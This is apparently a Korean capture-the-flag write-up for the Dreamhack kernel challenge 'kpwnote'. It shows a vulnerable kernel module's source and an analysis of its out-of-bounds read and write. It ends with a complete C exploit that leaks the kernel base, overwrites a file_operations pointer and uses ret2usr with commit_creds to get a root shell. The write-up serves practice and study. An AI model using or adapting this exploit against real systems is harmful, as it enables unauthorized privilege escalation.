---
title: Dreamhack - kpwnote
date: 2025-08-27 16:06:29 +0900
categories: [Labs, Dreamhack]
---

# 1. 분석

```c
// SPDX-License-Identifier: GPL-2.0

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/kernel.h>
#include <linux/rwsem.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define INITSTR "hi\n"

static DECLARE_RWSEM(sem);
static loff_t tlen = sizeof(INITSTR) - 1;
static unsigned char tmp[1024] = INITSTR;

loff_t my_lseek(struct file *file, loff_t offset, int whence)
{
	loff_t res, eof;

	res = down_read_interruptible(&sem);
	if (res)
		return res;
	eof = tlen;
	up_read(&sem);

	return generic_file_llseek_size(file, offset, whence, OFFSET_MAX, eof);
}

ssize_t my_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
	int res;

	if (!count)
		return 0;

	res = down_read_interruptible(&sem);
	if (res)
		return res;

	if (tlen > *ppos) {
		size_t n;
		loff_t maxlen = tlen - *ppos;

		if (maxlen <= SIZE_MAX && count > (size_t)maxlen)
			count = maxlen;

		n = copy_to_user(buf, tmp + *ppos, count);
		if (count == n)
			res = -EFAULT;

		count -= n;
	} else {
		count = 0;
	}
	up_read(&sem);

	if (res)
		return res;

	*ppos += count;

	return count;
}

ssize_t my_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
	int res;
	size_t n;

	if (!count)
		return 0;

	if (count > OFFSET_MAX || *ppos > OFFSET_MAX - count)
		return -ENOSPC;

	res = down_write_killable(&sem);
	if (res)
		return res;

	n = copy_from_user(tmp + *ppos, buf, count);
	tlen = max(tlen, *ppos + (loff_t)(count - n));
	up_write(&sem);

	if (count == n)
		return -EFAULT;

	count -= n;
	*ppos += count;

	return count;
}

```

이 전체 코드를 함수 단위로 분석 해보자

```c
loff_t my_lseek(struct file *file, loff_t offset, int whence)
{
	loff_t res, eof;

	res = down_read_interruptible(&sem);
	if (res)
		return res;
	eof = tlen;
	up_read(&sem);

	return generic_file_llseek_size(file, offset, whence, OFFSET_MAX, eof);
}
```

단순한 lseek로 보인다.

```c
static loff_t tlen = sizeof(INITSTR) - 1;
static unsigned char tmp[1024] = INITSTR;

ssize_t my_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
	int res;

	if (!count)
		return 0;

	res = down_read_interruptible(&sem);
	if (res)
		return res;

	if (tlen > *ppos) {
		size_t n;
		loff_t maxlen = tlen - *ppos;

		if (maxlen <= SIZE_MAX && count > (size_t)maxlen)
			count = maxlen;

		n = copy_to_user(buf, tmp + *ppos, count);
		if (count == n)
			res = -EFAULT;

		count -= n;
	} else {
		count = 0;
	}
	up_read(&sem);

	if (res)
		return res;

	*ppos += count;

	return count;
}
```

위 코드에서 만약 tlen > *ppos 를 만족시키고 ppos가 배열의 크기보다 크게 설정할 수 있다면 인포릭이 가능하다.

```c
static loff_t tlen = sizeof(INITSTR) - 1;
static unsigned char tmp[1024] = INITSTR;

ssize_t my_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
	int res;
	size_t n;

	if (!count)
		return 0;

	if (count > OFFSET_MAX || *ppos > OFFSET_MAX - count)
		return -ENOSPC;

	res = down_write_killable(&sem);
	if (res)
		return res;

	n = copy_from_user(tmp + *ppos, buf, count);
	tlen = max(tlen, *ppos + (loff_t)(count - n));
	up_write(&sem);

	if (count == n)
		return -EFAULT;

	count -= n;
	*ppos += count;

	return count;
}
```

여기서 tlen 설정이 가능하다. 

음 이제 어떻게 인포릭을 수행할지가 문제이다… maxlen 계산때문에 tmp 배열을 넘어서 값을 읽을 수 없는 것 같아 보인다.

# 2. 디버깅

분석을 편하게 하기 위해 nokaslr 옵션을 주고 gdb를 붙여주었다.

lseek로 오프셋을 조작하면 tmp를 기준으로 한다는 것을 확인.

그러면 배열 너머에서 쓰기가 가능하고, 써도 문제가 없는 공간을 찾아보던 중

fops 쪽을 쓰기로 했다.

fops를 덮을 수 있기 때문에 이 주소들 중 하나를 ret2usr 주소로 덮고 그 함수를 호출하면 ret2usr가 호출될 것이다.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>

void *(*prepare_kernel_cred)(void *);
int (*commit_cred)(void *);
uint64_t dummy_stack[1024] __attribute__((aligned(16)));

void shell(){
    puts("Get shell.\n");
    system("/bin/sh");
}

void ret2usr(){
    static struct trap_frame {
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void *rsp;
        uint64_t ss;
    } tf = {
        .rip = &shell,
        .cs = 0x33,
        .rflags = 0x202,
        .rsp = dummy_stack + 1024,
        .ss = 0x2b
    };
    volatile register uint64_t RSP asm("rsp");
    commit_cred(prepare_kernel_cred(0));
    RSP = (uint64_t)&tf;

    asm volatile(
        "cli\n\t"
        "swapgs\n\t"
        "iretq"
        :: "r" (RSP)
    );
}

int main(){

    char buf[8] = {0, };
    char buf1[8] = {0, };
    unsigned long k_base = 0;
    
    int fd = open("/proc/kpwnote",O_RDWR | O_NONBLOCK);

    if(fd == -1){
        perror("open");
        exit(-1);
    }

    lseek(fd,0x400+(0x8 * 15),SEEK_SET);
    write(fd,'a',1);
    lseek(fd,0x400+(0x8 * 14),SEEK_SET); //leak my_read addr

    read(fd,buf,0x8);

    memcpy(&k_base,buf,0x8);
    k_base -= 0x2b4880;
    commit_cred = k_base + 0x000634e0;
    prepare_kernel_cred = k_base + 0x00063370;

    printf("kbase : 0x%lx\n",k_base);
    printf("commit_cred : 0x%lx\n",commit_cred);
    printf("prepare_kernel_cred : 0x%lx\n",prepare_kernel_cred);

    uint64_t ret2usr_addr = (uint64_t)ret2usr;

    lseek(fd,0x400+(0x8 * 14),SEEK_SET);
    write(fd,&ret2usr_addr,0x8); // my_read -> ret2usr

    read(fd,buf1,0x8);

    return 0;
}
```

근데 이걸 그냥 static 컴파일해서 서버로 넘기면 용량이 커서 그런지 안넘어간다..

그래서 zip 압축해서 넘겨줬다.